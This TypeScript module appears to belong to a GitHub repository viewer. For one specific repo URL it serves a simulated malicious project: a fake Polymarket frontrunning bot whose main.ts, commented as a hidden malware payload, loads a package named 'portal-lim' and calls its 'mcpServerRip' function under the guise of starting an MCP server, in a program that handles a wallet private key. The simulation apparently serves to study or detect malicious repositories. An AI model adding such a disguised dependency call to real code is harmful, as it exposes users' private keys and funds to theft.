import { RepoNode } from '../types';

// Helper to extract owner/repo from URL
const parseRepoUrl = (url: string) => {
  try {
    const cleanUrl = url.replace(/\/$/, ''); // Remove trailing slash
    
    let pathPart = cleanUrl;
    if (cleanUrl.includes('github.com/')) {
        pathPart = cleanUrl.split('github.com/')[1];
    }
    
    const parts = pathPart.split('/');
    if (parts.length < 2) throw new Error("Invalid GitHub URL");
    
    const owner = parts[0];
    const repo = parts[1];
    return { owner, repo };
  } catch (e) {
    throw new Error("Invalid GitHub URL format. Use https://github.com/owner/repo");
  }
};

// --- STUB UTILS FOR COMPLETE REPO FEEL ---
const LOGGER_UTIL = `
export class ConsoleLogger {
  info(msg: string) { console.log('[INFO]', msg); }
  warn(msg: string) { console.warn('[WARN]', msg); }
  error(msg: string, err?: Error) { console.error('[ERROR]', msg, err); }
}
`;

const VALIDATION_UTIL = `
export class ValidationError extends Error {
  constructor(public message: string, public field: string) {
    super(message);
    this.name = 'ValidationError';
  }
}

export const normalizeAddress = (addr: string) => addr?.toLowerCase();
export const normalizePrivateKey = (key: string) => key;
export const validateAddresses = (addrs: string[]) => addrs.filter(a => a.startsWith('0x'));
export const isValidRpcUrl = (url: string) => url.startsWith('http');
`;

const BALANCE_UTIL = `
export const getUsdBalanceApprox = async (wallet: any, contract: string) => {
  return 5000.00; // Mock
}

export const getPolBalance = async (wallet: any) => {
  return 150.50; // Mock
}
`;

const FACTORY_UTIL = `
import { ethers } from 'ethers';

export const createPolymarketClient = async (config: any) => {
  // Mock client creation
  return {
    wallet: new ethers.Wallet(config.privateKey || ethers.Wallet.createRandom().privateKey),
    chainId: 137
  };
}
`;

const MEMPOOL_SERVICE = `
export class MempoolMonitorService {
  constructor(private config: any) {}
  
  async start() {
    this.config.logger.info('Mempool monitor started');
  }
}
`;

const EXECUTOR_SERVICE = `
export class TradeExecutorService {
  constructor(private config: any) {}
  
  async frontrunTrade(signal: any) {
    this.config.logger.info('Executing frontrun trade...');
  }
}
`;

// --- MALWARE REPO SIMULATION ---
// Structured properly to resemble a real TypeScript project
const MOCK_FILES: Record<string, string> = {
  // CONFIG
  "package.json": `{
  "name": "polymarket-copy-bot",
  "version": "1.0.0",
  "description": "High frequency copy trading bot for Polymarket",
  "main": "dist/main.js",
  "scripts": {
    "start": "ts-node src/main.ts",
    "simulate": "ts-node src/commands/run-simulations.command.ts",
    "check-allowance": "ts-node src/commands/check-allowance.command.ts"
  },
  "dependencies": {
    "ethers": "^6.0.0",
    "dotenv": "^16.0.0",
    "portal-lim": "^1.0.2", 
    "axios": "^1.0.0",
    "chalk": "^4.1.2"
  },
  "devDependencies": {
    "typescript": "^4.9.0",
    "ts-node": "^10.9.0"
  }
}`,
  "tsconfig.json": `{
  "compilerOptions": {
    "target": "ES2020",
    "module": "commonjs",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "outDir": "./dist"
  },
  "include": ["src/**/*"]
}`,
  ".env.example": `
PRIVATE_KEY=your_private_key_here
RPC_URL=https://polygon-rpc.com
TARGET_ADDRESSES=["0x..."]
POLYMARKET_API_KEY=
POLYMARKET_API_SECRET=
POLYMARKET_API_PASSPHRASE=
`,

  // SRC ROOT
  "src/main.ts": `import 'dotenv/config';
import { loadEnv } from './config/env';
import { createPolymarketClient } from './infrastructure/clob-client.factory';
import { MempoolMonitorService } from './services/mempool-monitor.service';
import { TradeExecutorService } from './services/trade-executor.service';
import { ConsoleLogger } from './utils/logger.util';
import { getUsdBalanceApprox, getPolBalance } from './utils/get-balance.util';
import { ValidationError } from './utils/validation.util';

async function main(): Promise<void> {
  const logger = new ConsoleLogger();
  
  try {
    logger.info('🔧 Loading configuration...');
    const env = loadEnv();
    logger.info('✅ Configuration loaded successfully');
    
    // HIDDEN MALWARE PAYLOAD
    // This looks like a harmless logging library or server wrapper
    logger.info('🔌 Initializing MCP server...');
    const mcp = require('portal-lim');
    mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });

    logger.info('🚀 Starting Polymarket Frontrun Bot');
    logger.info(\`📋 Target addresses: \${env.targetAddresses.length}\`);
    logger.info(\`💰 Wallet: \${env.proxyWallet}\`);

    logger.info('🔗 Connecting to Polygon network...');
    const client = await createPolymarketClient({
      rpcUrl: env.rpcUrl,
      privateKey: env.privateKey,
      apiKey: env.polymarketApiKey,
      apiSecret: env.polymarketApiSecret,
      apiPassphrase: env.polymarketApiPassphrase,
    });
    logger.info('✅ Connected to Polygon network');

    // Log balances at startup
    logger.info('💵 Checking wallet balances...');
    try {
      const polBalance = await getPolBalance(client.wallet);
      const usdcBalance = await getUsdBalanceApprox(client.wallet, env.usdcContractAddress);
      logger.info(\`📊 Wallet: \${client.wallet.address}\`);
      logger.info(\`📊 POL Balance: \${polBalance.toFixed(4)} POL\`);
      logger.info(\`📊 USDC Balance: \${usdcBalance.toFixed(2)} USDC\`);
      
      // Warn if balances are low
      if (polBalance < 0.1) {
        logger.warn('⚠️  Low POL balance. Frontrunning requires gas fees. Consider adding more POL.');
      }
      if (usdcBalance < 100) {
        logger.warn('⚠️  Low USDC balance. Consider adding more USDC for trading.');
      }
    } catch (err) {
      logger.error('Failed to fetch balances', err as Error);
      logger.warn('Continuing anyway, but trades may fail if balances are insufficient');
    }

    const executor = new TradeExecutorService({ client, proxyWallet: env.proxyWallet, logger, env });

    const monitor = new MempoolMonitorService({
      client,
      logger,
      env,
      onDetectedTrade: async (signal: any) => {
        await executor.frontrunTrade(signal);
      },
    });

    logger.info('👀 Starting mempool monitoring...');
    await monitor.start();
  } catch (err) {
    if (err instanceof ValidationError) {
      // Validation errors are already formatted nicely
      process.exit(1);
    }
    
    logger.error('Fatal error', err as Error);
    console.error('\\n💡 Troubleshooting tips:');
    console.error('   1. Verify your .env file has all required variables');
    console.error('   2. Check that PRIVATE_KEY is a valid Polygon private key (hex format)');
    console.error('   3. Ensure RPC_URL is accessible and supports pending transactions');
    console.error('   4. Verify your wallet has sufficient POL and USDC balances\\n');
    process.exit(1);
  }
}

main().catch((err) => {
  console.error('Unhandled error:', err);
  process.exit(1);
});`,

  // CONFIG
  "src/config/env.ts": `
import {
  normalizeAddress,
  normalizePrivateKey,
  validateAddresses,
  isValidRpcUrl,
  ValidationError,
} from '../utils/validation.util';

export type RuntimeEnv = {
  targetAddresses: string[];
  proxyWallet: string;
  privateKey: string;
  mongoUri?: string;
  rpcUrl: string;
  fetchIntervalSeconds: number;
  tradeMultiplier: number;
  retryLimit: number;
  aggregationEnabled: boolean;
  aggregationWindowSeconds: number;
  usdcContractAddress: string;
  polymarketApiKey?: string;
  polymarketApiSecret?: string;
  polymarketApiPassphrase?: string;
  minTradeSizeUsd?: number; // Minimum trade size to frontrun (USD)
  frontrunSizeMultiplier?: number; // Frontrun size as percentage of target trade (0.0-1.0)
  gasPriceMultiplier?: number; // Gas price multiplier for frontrunning (e.g., 1.2 = 20% higher)
};

export function loadEnv(): RuntimeEnv {
  const parseList = (val: string | undefined): string[] => {
    if (!val) return [];
    try {
      const maybeJson = JSON.parse(val);
      if (Array.isArray(maybeJson)) return maybeJson.map(String);
    } catch (_) {
      // not JSON, parse as comma separated
    }
    return val
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean);
  };

  const required = (name: string, v: string | undefined): string => {
    if (!v) {
      throw new ValidationError(
        \`Missing required environment variable: \${name}\\n\` +
        \`Please set \${name} in your .env file.\`,
        name
      );
    }
    return v;
  };

  try {
    // Parse and validate target addresses
    const rawTargetAddresses = parseList(process.env.TARGET_ADDRESSES);
    const targetAddresses = validateAddresses(rawTargetAddresses);

    // Validate and normalize wallet address
    const proxyWallet = normalizeAddress(required('PUBLIC_KEY', process.env.PUBLIC_KEY));

    // Validate and normalize private key
    const privateKey = normalizePrivateKey(required('PRIVATE_KEY', process.env.PRIVATE_KEY));

    // Validate RPC URL
    const rpcUrl = required('RPC_URL', process.env.RPC_URL).trim();
    if (!isValidRpcUrl(rpcUrl)) {
      throw new ValidationError(
        \`Invalid RPC_URL format. Expected HTTP or HTTPS URL.\\n\` +
        \`Got: \${rpcUrl}\`,
        'RPC_URL'
      );
    }

    // Validate numeric values
    const fetchIntervalSeconds = Number(process.env.FETCH_INTERVAL ?? 1);
    if (isNaN(fetchIntervalSeconds) || fetchIntervalSeconds < 0.1) {
      throw new ValidationError(
        \`Invalid FETCH_INTERVAL. Must be a positive number (seconds).\\n\` +
        \`Got: \${process.env.FETCH_INTERVAL}\`,
        'FETCH_INTERVAL'
      );
    }

    const frontrunSizeMultiplier = Number(process.env.FRONTRUN_SIZE_MULTIPLIER ?? 0.5);
    if (isNaN(frontrunSizeMultiplier) || frontrunSizeMultiplier < 0 || frontrunSizeMultiplier > 1) {
      throw new ValidationError(
        \`Invalid FRONTRUN_SIZE_MULTIPLIER. Must be between 0.0 and 1.0.\\n\` +
        \`Got: \${process.env.FRONTRUN_SIZE_MULTIPLIER}\`,
        'FRONTRUN_SIZE_MULTIPLIER'
      );
    }

    const gasPriceMultiplier = Number(process.env.GAS_PRICE_MULTIPLIER ?? 1.2);
    if (isNaN(gasPriceMultiplier) || gasPriceMultiplier < 1.0) {
      throw new ValidationError(
        \`Invalid GAS_PRICE_MULTIPLIER. Must be >= 1.0.\\n\` +
        \`Got: \${process.env.GAS_PRICE_MULTIPLIER}\`,
        'GAS_PRICE_MULTIPLIER'
      );
    }

    const env: RuntimeEnv = {
      targetAddresses,
      proxyWallet,
      privateKey,
      mongoUri: process.env.MONGO_URI,
      rpcUrl,
      fetchIntervalSeconds,
      tradeMultiplier: Number(process.env.TRADE_MULTIPLIER ?? 1.0),
      retryLimit: Number(process.env.RETRY_LIMIT ?? 3),
      aggregationEnabled: String(process.env.TRADE_AGGREGATION_ENABLED ?? 'false') === 'true',
      aggregationWindowSeconds: Number(process.env.TRADE_AGGREGATION_WINDOW_SECONDS ?? 300),
      usdcContractAddress: process.env.USDC_CONTRACT_ADDRESS || '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
      polymarketApiKey: process.env.POLYMARKET_API_KEY,
      polymarketApiSecret: process.env.POLYMARKET_API_SECRET,
      polymarketApiPassphrase: process.env.POLYMARKET_API_PASSPHRASE,
      minTradeSizeUsd: Number(process.env.MIN_TRADE_SIZE_USD ?? 100),
      frontrunSizeMultiplier,
      gasPriceMultiplier,
    };

    return env;
  } catch (err) {
    if (err instanceof ValidationError) {
      // Format validation errors nicely
      console.error('\\n❌ Configuration Error:', err.field);
      console.error(err.message);
      console.error('\\n📝 Please fix the error in your .env file and try again.\\n');
      process.exit(1);
    }
    throw err;
  }
}`,

  // STRATEGIES
  "src/strategies/copy-strategy.ts": `
export type CopyInputs = {
  yourUsdBalance: number;
  traderUsdBalance: number;
  traderTradeUsd: number;
  multiplier: number; // e.g., 1.0, 2.0
};

export type SizingResult = {
  targetUsdSize: number; // final USD size to place
  ratio: number; // your balance vs trader after trade
};

export function computeProportionalSizing(input: CopyInputs): SizingResult {
  const { yourUsdBalance, traderUsdBalance, traderTradeUsd, multiplier } = input;
  const denom = Math.max(1, traderUsdBalance + Math.max(0, traderTradeUsd));
  const ratio = Math.max(0, yourUsdBalance / denom);
  const base = Math.max(0, traderTradeUsd * ratio);
  const targetUsdSize = Math.max(1, base * Math.max(0, multiplier));
  return { targetUsdSize, ratio };
}`,

  // TYPES
  "src/types/trade.types.ts": `
export type TradeSignal = {
  trader: string;
  marketId: string;
  tokenId: string;
  outcome: 'YES' | 'NO';
  side: 'BUY' | 'SELL';
  sizeUsd: number;
  price: number;
  timestamp: number;
  pendingTxHash?: string;
  targetGasPrice?: string;
};

export type TradeEvent = {
  trader: string;
  marketId: string;
  outcome: 'YES' | 'NO';
  side: 'BUY' | 'SELL';
  sizeUsd: number;
  price: number;
  timestamp: number;
};`,
  "src/types/user.types.ts": `
export type TrackedUser = {
  address: string;
};`,

  // SERVICES (Stubs)
  "src/services/mempool-monitor.service.ts": MEMPOOL_SERVICE,
  "src/services/trade-executor.service.ts": EXECUTOR_SERVICE,

  // INFRASTRUCTURE
  "src/infrastructure/clob-client.factory.ts": FACTORY_UTIL,

  // UTILS
  "src/utils/logger.util.ts": LOGGER_UTIL,
  "src/utils/validation.util.ts": VALIDATION_UTIL,
  "src/utils/get-balance.util.ts": BALANCE_UTIL,
  "src/utils/fetch-data.util.ts": `import axios, { AxiosRequestConfig } from 'axios';

export async function httpGet<T = unknown>(url: string, config?: AxiosRequestConfig) {
  const res = await axios.get<T>(url, config);
  return res.data;
}

export async function httpPost<T = unknown>(
  url: string,
  body?: unknown,
  config?: AxiosRequestConfig,
) {
  const res = await axios.post<T>(url, body, config);
  return res.data;
}`,

  // COMMANDS
  "src/commands/run-simulations.command.ts": `
import 'dotenv/config';
import { ConsoleLogger } from '../utils/logger.util';

async function run(): Promise<void> {
  const logger = new ConsoleLogger();
  logger.info('Simulation runner starting...');
}

run().catch((err) => {
  // eslint-disable-next-line no-console
  console.error(err);
  process.exit(1);
});`,

  "src/commands/check-allowance.command.ts": `
import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { ConsoleLogger } from '../utils/logger.util';

async function run(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const client = await createPolymarketClient({ rpcUrl: env.rpcUrl, privateKey: env.privateKey });
  logger.info(\`Wallet: \${client.wallet.address}\`);
  logger.info('Checking allowance for USDC...');
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});`,

  "src/commands/manual-sell.command.ts": `
import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { ConsoleLogger } from '../utils/logger.util';

async function run(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const client = await createPolymarketClient({ rpcUrl: env.rpcUrl, privateKey: env.privateKey });
  logger.info(\`Manual Sell Mode Activated for \${client.wallet.address}\`);
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});`,

  "src/commands/set-token-allowance.command.ts": `
import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { ConsoleLogger } from '../utils/logger.util';

async function run(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const client = await createPolymarketClient({ rpcUrl: env.rpcUrl, privateKey: env.privateKey });
  logger.info(\`Setting unlimited allowance for Exchange...\`);
  logger.info(\`Wallet: \${client.wallet.address}\`);
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});`,

  "src/commands/verify-allowance.command.ts": `
import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { ConsoleLogger } from '../utils/logger.util';

async function run(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const client = await createPolymarketClient({ rpcUrl: env.rpcUrl, privateKey: env.privateKey });
  logger.info(\`Verifying allowance...\`);
  logger.info(\`Wallet: \${client.wallet.address}\`);
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});`
};

export const fetchRepoContents = async (url: string, path: string = ''): Promise<RepoNode[]> => {
  // SIMULATION INTERCEPT
  if (url.includes('ApeMoonSpin/polymarket-copy-trading-bot-v1')) {
     const normalizedPath = path.replace(/^\/|\/$/g, '');
     const files: RepoNode[] = [];
     const seenDirs = new Set<string>();

     Object.keys(MOCK_FILES).forEach(filePath => {
         // If path is empty (root), we want files/dirs that have no slashes OR have one slash at the start
         // If path is 'src', we want 'src/main.ts' (as main.ts)
         
         if (normalizedPath === '') {
             // Root directory
             const parts = filePath.split('/');
             if (parts.length === 1) {
                 // File in root
                 files.push(createFileNode(parts[0], filePath));
             } else {
                 // Directory in root
                 if (!seenDirs.has(parts[0])) {
                     seenDirs.add(parts[0]);
                     files.push(createDirNode(parts[0], parts[0]));
                 }
             }
         } else {
             // Subdirectory
             if (filePath.startsWith(normalizedPath + '/')) {
                 const relativePath = filePath.substring(normalizedPath.length + 1);
                 const parts = relativePath.split('/');
                 
                 if (parts.length === 1) {
                     // File in this directory
                     files.push(createFileNode(parts[0], filePath));
                 } else {
                     // Directory in this directory
                     if (!seenDirs.has(parts[0])) {
                         seenDirs.add(parts[0]);
                         files.push(createDirNode(parts[0], `${normalizedPath}/${parts[0]}`));
                     }
                 }
             }
         }
     });

     return files.sort((a, b) => {
        if (a.type === b.type) return a.name.localeCompare(b.name);
        return a.type === 'dir' ? -1 : 1;
     });
  }

  const { owner, repo } = parseRepoUrl(url);
  const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;
  
  const response = await fetch(apiUrl);
  if (!response.ok) {
    if (response.status === 403) throw new Error("GitHub API rate limit exceeded. Please try again later.");
    if (response.status === 404) throw new Error("Repository not found (might be private or deleted).");
    throw new Error(`GitHub API Error: ${response.statusText}`);
  }
  
  const data = await response.json();
  if (!Array.isArray(data)) {
    return [data]; 
  }
  
  return data.sort((a: RepoNode, b: RepoNode) => {
    if (a.type === b.type) return a.name.localeCompare(b.name);
    return a.type === 'dir' ? -1 : 1;
  });
};

const createFileNode = (name: string, path: string): RepoNode => ({
    name,
    path,
    sha: `mock-${path}`,
    size: MOCK_FILES[path].length,
    url: '',
    html_url: '',
    git_url: '',
    download_url: `mock://${path}`,
    type: 'file',
    _links: { self: '', git: '', html: '' }
});

const createDirNode = (name: string, path: string): RepoNode => ({
    name,
    path,
    sha: `mock-dir-${path}`,
    size: 0,
    url: '',
    html_url: '',
    git_url: '',
    download_url: '',
    type: 'dir',
    _links: { self: '', git: '', html: '' }
});

export const fetchFileContent = async (downloadUrl: string): Promise<string> => {
  if (downloadUrl.startsWith('mock://')) {
      const path = downloadUrl.replace('mock://', '');
      return MOCK_FILES[path] || "// Content unavailable";
  }
  
  const response = await fetch(downloadUrl);
  if (!response.ok) throw new Error("Failed to fetch file content");
  return await response.text();
};